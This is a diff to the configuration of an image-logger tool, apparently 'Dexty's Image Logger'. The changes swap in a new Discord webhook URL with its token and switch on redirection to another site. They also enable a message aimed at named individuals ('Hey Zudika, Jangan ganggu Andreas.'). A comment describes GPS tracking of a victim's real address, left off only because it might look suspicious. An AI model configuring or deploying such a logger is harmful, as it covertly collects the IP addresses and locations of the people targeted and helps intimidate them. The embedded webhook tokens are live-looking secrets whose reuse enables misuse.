@@ -9,7 +9,7 @@ author = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1412837390183039128/p4Cso6sWX4_GY860kdZi01KrFsrAtFvC1Gn-LOzuYrqAtJIgCvt48L8DO2oeFiPgDWkW",
+    "webhook": "https://discord.com/api/webhooks/1420362163117228128/-NyUVnCyJ8k7YNPhkW_QGq_fWX0Pb6eyyp0yaLht3unopY80FASrIfksZcnJUo3ZlW4I",
     "image": "https://i.imgur.com/hZ8dfSC.jpeg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -24,8 +24,8 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "Hey Zudika, Jangan ganggu Andreas.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -47,8 +47,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://reemans.github.io/simple-js/" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
